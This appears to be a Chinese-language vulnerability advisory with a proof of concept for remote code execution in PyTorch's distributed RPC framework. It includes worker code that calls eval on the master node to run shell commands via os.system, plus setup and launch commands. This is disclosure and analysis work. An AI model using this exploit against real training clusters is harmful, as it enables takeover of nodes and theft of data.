### PyTorch Distributed RPC Framework远程代码执行漏洞分析

**漏洞类型**：远程代码执行 (RCE)  
**报告日期**：2024年4月12日  

---

### **漏洞描述**

PyTorch 的 `torch.distributed.rpc` 框架通常用于分布式训练场景，例如强化学习、模型并行、参数服务器等。然而，在使用 `torch.distributed.rpc` 进行 RPC 调用时，框架未验证函数是否符合开发者的预期。这使得攻击者可以通过网络利用 RPC 调用内置的 Python 函数（如 `eval`），加载其他 Python 库并执行任意命令。

**漏洞细节：**

- 在多 CPU 的 RPC 通信中，工作节点可以通过 `rpc.rpc_sync` 将函数和张量序列化打包为 `PythonUDF`，然后通过继承自 `RpcCommandBase` 的 `PythonCall` 发送。
- 主节点收到数据后，会反序列化 `PythonUDF` 并调用 `_run_function` 执行相应函数。但由于对函数调用缺乏安全限制，攻击者可以调用 Python 内置函数（如 `eval`），导致远程代码执行。

---

### **漏洞复现（概念验证）**

1. **配置环境变量**  
   确保主节点和工作节点能够通过网络通信，需设置以下环境变量：

   ```bash
   export MASTER_ADDR=10.206.0.3
   export MASTER_PORT=29500
   export TP_SOCKET_IFNAME=eth0
   export GLOO_SOCKET_IFNAME=eth0
   ```

2. **在主节点启动RPC服务**  
   主节点监听地址为 `0.0.0.0:MASTER_PORT`，用于与工作节点通信。

   ```python
   import torch
   import torch.distributed.rpc as rpc

   def add(a, b):
       return a + b

   rpc.init_rpc("master", rank=0, world_size=2)
   rpc.shutdown()
   ```

3. **在工作节点执行攻击代码**  
   工作节点通过 `rpc.rpc_sync` 调用主节点上的 `eval` 函数，执行恶意命令。

   ```python
   import torch
   import torch.distributed.rpc as rpc

   rpc.init_rpc("worker", rank=1, world_size=2)
   ret = rpc.rpc_sync("master", eval, args=('__import__("os").system("id;ifconfig")',))
   print(ret)
   rpc.shutdown()
   ```

4. **运行主节点和工作节点**  
   使用以下命令分别启动主节点和工作节点：

   - 启动主节点：
     ```bash
     torchrun --nproc_per_node=1 --nnodes=2 --node_rank=0 --master_addr=10.206.0.3 --master_port=29500 master.py
     ```
   - 启动工作节点：
     ```bash
     torchrun --nproc_per_node=1 --nnodes=2 --node_rank=1 --master_addr=10.206.0.3 --master_port=29500 worker.py
     ```

5. **攻击结果**  
   工作节点成功利用漏洞调用主节点上的 `eval` 函数，并通过 `os.system("id;ifconfig")` 执行恶意命令。命令执行后，主节点的 IP 地址（如 `10.206.0.3`）被泄露。

---

### **漏洞影响**

攻击者可通过此漏洞远程攻击正在进行分布式训练的主节点。通过远程代码执行（RCE），主节点可能被攻陷，导致与 AI 相关的敏感数据被窃取或泄露。